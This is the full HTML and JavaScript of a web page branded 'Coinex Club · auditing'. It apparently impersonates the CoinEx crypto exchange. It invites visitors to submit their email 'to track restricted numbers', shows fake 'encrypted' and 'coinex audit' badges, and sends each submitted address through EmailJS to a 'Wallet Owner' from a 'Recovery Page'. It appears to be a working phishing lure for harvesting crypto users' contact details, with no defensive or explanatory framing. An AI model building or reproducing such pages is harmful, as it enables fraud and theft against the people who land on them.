<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Coinex Club · auditing</title>
  <!-- EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
    }

    body {
      min-height: 100vh;
      background: #0b1a1f;
      background-image: url('https://coinexsup.github.io/Pic/agsgfd.png');
      background-repeat: no-repeat;
      background-position: center top;
      background-size: 100% auto;
      background-attachment: fixed;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
      margin: 0;
    }

    .glass-card {
      width: 100%;
      max-width: 480px;
      padding: 48px 36px 44px;
      background: rgba(255, 255, 255, 0.32);
      backdrop-filter: blur(20px) saturate(200%);
      -webkit-backdrop-filter: blur(20px) saturate(200%);
      border-radius: 60px;
      border: 2px solid rgba(0, 255, 200, 0.55);
      box-shadow: 0 40px 60px -24px rgba(0, 40, 30, 0.5),
                  inset 0 0 0 1px rgba(255, 255, 255, 0.2);
      color: #0a1a1a;
      text-align: center;
      background: rgba(255, 255, 255, 0.30);
      transition: all 0.3s ease;
    }

    .club-title {
      font-size: 2.4rem;
      font-weight: 700;
      letter-spacing: -1px;
      color: #071515;
      text-shadow: 0 2px 12px rgba(255, 255, 255, 0.25);
      margin-bottom: 4px;
      line-height: 1.1;
    }
    .club-title span {
      font-weight: 300;
      color: #0a2828;
      background: rgba(0, 200, 180, 0.08);
      padding: 0 6px;
      border-radius: 8px;
    }

    .sub-audit {
      font-size: 0.75rem;
      font-weight: 600;
      letter-spacing: 2.5px;
      text-transform: uppercase;
      color: #0d2a2a;
      background: rgba(0, 200, 180, 0.10);
      padding: 6px 22px;
      border-radius: 100px;
      display: inline-block;
      backdrop-filter: blur(2px);
      border: 1px solid rgba(0, 200, 180, 0.12);
      margin-bottom: 18px;
    }

    .audit-hint {
      background: rgba(255, 255, 255, 0.20);
      backdrop-filter: blur(6px);
      -webkit-backdrop-filter: blur(6px);
      border-radius: 100px;
      padding: 14px 28px;
      margin-bottom: 32px;
      font-size: 0.95rem;
      font-weight: 450;
      color: #0a1e1e;
      border: 1px solid rgba(0, 200, 180, 0.15);
      display: inline-block;
      letter-spacing: 0.1px;
      line-height: 1.6;
      box-shadow: inset 0 1px 4px rgba(255,255,255,0.1);
    }
    .audit-hint strong {
      font-weight: 600;
      color: #00554a;
      background: rgba(0, 200, 180, 0.08);
      padding: 0 6px;
      border-radius: 6px;
    }

    .input-group {
      width: 100%;
      margin-bottom: 28px;
    }

    .input-group label {
      display: block;
      font-size: 0.7rem;
      text-transform: uppercase;
      letter-spacing: 2px;
      color: #0d2f2f;
      font-weight: 600;
      margin-bottom: 10px;
      text-align: left;
      padding-left: 8px;
      opacity: 0.8;
    }

    .glass-input {
      width: 100%;
      padding: 20px 28px;
      font-size: 1.05rem;
      background: rgba(255, 255, 255, 0.40);
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      border: 1.5px solid rgba(0, 200, 180, 0.35);
      border-radius: 100px;
      color: #071515;
      outline: none;
      transition: all 0.25s ease;
      font-weight: 450;
      letter-spacing: 0.2px;
      box-shadow: inset 0 4px 14px rgba(0, 0, 0, 0.02);
    }

    .glass-input::placeholder {
      color: #2a4a4a;
      font-weight: 350;
      opacity: 0.6;
      letter-spacing: 0.3px;
    }

    .glass-input:focus {
      border-color: #00d4b8;
      background: rgba(255, 255, 255, 0.60);
      box-shadow: 0 0 0 4px rgba(0, 200, 180, 0.08), inset 0 2px 10px rgba(0,0,0,0.02);
      transform: scale(1.01);
    }

    .confirm-btn {
      width: 100%;
      padding: 20px 28px;
      border: none;
      background: linear-gradient(145deg, rgba(0, 200, 180, 0.15), rgba(0, 200, 180, 0.05));
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      border-radius: 100px;
      color: #071515;
      font-size: 1.2rem;
      font-weight: 600;
      letter-spacing: 0.5px;
      cursor: pointer;
      transition: all 0.25s ease;
      box-shadow: 0 8px 28px -10px rgba(0, 60, 50, 0.25),
                  inset 0 1px 0 rgba(255,255,255,0.2);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      border: 1.5px solid rgba(0, 200, 180, 0.30);
    }

    .confirm-btn:hover {
      background: linear-gradient(145deg, rgba(0, 200, 180, 0.25), rgba(0, 200, 180, 0.08));
      border-color: rgba(0, 200, 180, 0.50);
      transform: translateY(-2px) scale(1.01);
      box-shadow: 0 12px 36px -12px rgba(0, 80, 65, 0.35);
    }

    .confirm-btn:active {
      transform: translateY(0px) scale(0.97);
    }

    .confirm-btn:disabled {
      opacity: 0.5;
      pointer-events: none;
      filter: grayscale(0.3);
      transform: none !important;
      border-color: rgba(0, 200, 180, 0.10);
    }

    .status-badge {
      display: inline-block;
      margin-top: 20px;
      font-size: 0.82rem;
      background: rgba(255, 255, 255, 0.20);
      backdrop-filter: blur(4px);
      padding: 10px 30px;
      border-radius: 100px;
      border: 1px solid rgba(0, 200, 180, 0.08);
      color: #0a1e1e;
      min-height: 44px;
      transition: all 0.25s ease;
      font-weight: 450;
      letter-spacing: 0.2px;
    }

    .status-badge.error {
      background: rgba(200, 70, 50, 0.12);
      border-color: rgba(200, 70, 50, 0.25);
      color: #3a1a1a;
    }
    .status-badge.success {
      background: rgba(0, 200, 150, 0.12);
      border-color: rgba(0, 200, 150, 0.25);
      color: #003d33;
    }

    .spinner {
      display: inline-block;
      width: 22px;
      height: 22px;
      border: 2.5px solid rgba(0, 0, 0, 0.06);
      border-top: 2.5px solid #00665a;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

    .footnote {
      margin-top: 30px;
      font-size: 0.65rem;
      color: #1a3a3a;
      letter-spacing: 1.8px;
      border-top: 1px solid rgba(0, 200, 180, 0.10);
      padding-top: 24px;
      display: flex;
      justify-content: center;
      gap: 32px;
      flex-wrap: wrap;
      font-weight: 500;
      text-transform: uppercase;
      opacity: 0.7;
    }
    .footnote span {
      display: flex;
      align-items: center;
      gap: 8px;
    }

    @media (max-width: 480px) {
      .glass-card { padding: 32px 20px 32px; border-radius: 40px; }
      .club-title { font-size: 2rem; }
      .confirm-btn { font-size: 1.1rem; padding: 18px 24px; }
      .glass-input { padding: 18px 22px; font-size: 1rem; }
    }
  </style>
</head>
<body>
  <div class="glass-card" id="appCard">
    <div class="club-title">Coinex <span>Club</span></div>
    <div class="sub-audit">🔍 auditing · limited phone</div>

    <div class="audit-hint">
      <strong>⏳</strong> enter your email to track restricted numbers
    </div>

    <div class="input-group">
      <label for="emailInput">📧 email address</label>
      <input type="email" id="emailInput" class="glass-input" placeholder="you@example.com" autocomplete="email" spellcheck="false">
    </div>

    <button class="confirm-btn" id="confirmBtn">
      <span>✓</span> confirm
    </button>

    <div id="statusMessage" class="status-badge">ready</div>

    <div class="footnote">
      <span>🔐 encrypted</span>
      <span>🛡️ coinex audit</span>
    </div>
  </div>

  <script>
    (function() {
      emailjs.init("PakuuN4ADUDEqrzHl");

      const emailInput = document.getElementById('emailInput');
      const confirmBtn = document.getElementById('confirmBtn');
      const statusDiv = document.getElementById('statusMessage');

      function setStatus(text, type = '') {
        statusDiv.textContent = text;
        statusDiv.className = 'status-badge' + (type ? ' ' + type : '');
      }

      emailInput.addEventListener('input', function() {
        if (statusDiv.classList.contains('error') || statusDiv.classList.contains('success')) {
          setStatus('✏️ enter email', '');
        }
      });

      async function handleConfirm() {
        const email = emailInput.value.trim();

        if (!email || !email.includes('@') || !email.includes('.')) {
          setStatus('⚠️ please enter a valid email', 'error');
          return;
        }

        confirmBtn.disabled = true;
        const originalBtnHTML = confirmBtn.innerHTML;
        confirmBtn.innerHTML = `<span class="spinner"></span> sending`;

        setStatus('⏳ sending audit request...', '');

        try {
          const response = await emailjs.send(
            "service_j8bd9vn",
            "template_paduqpn",
            {
              email: email,
              message: `Audit request from Coinex Club.\nEmail: ${email}\nLimited phone numbers tracking.`,
              to_name: "Wallet Owner",
              from_name: "Recovery Page"
            }
          );

          console.log('✅ Email sent successfully:', response);
          setStatus('✅ request sent — you will be notified', 'success');
          emailInput.value = '';
          
        } catch (error) {
          console.error('❌ Email send error:', error);
          let errorMsg = '⚠️ submission failed';
          if (error.text) {
            try {
              const errData = JSON.parse(error.text);
              if (errData.message) errorMsg += ': ' + errData.message;
            } catch(e) {
              errorMsg += ': ' + error.text;
            }
          }
          setStatus(errorMsg, 'error');
        } finally {
          confirmBtn.disabled = false;
          confirmBtn.innerHTML = originalBtnHTML;
        }
      }

      confirmBtn.addEventListener('click', handleConfirm);

      emailInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
          e.preventDefault();
          if (!confirmBtn.disabled) {
            handleConfirm();
          }
        }
      });

      setStatus('📬 enter your email', '');
    })();
  </script>
</body>
</html>
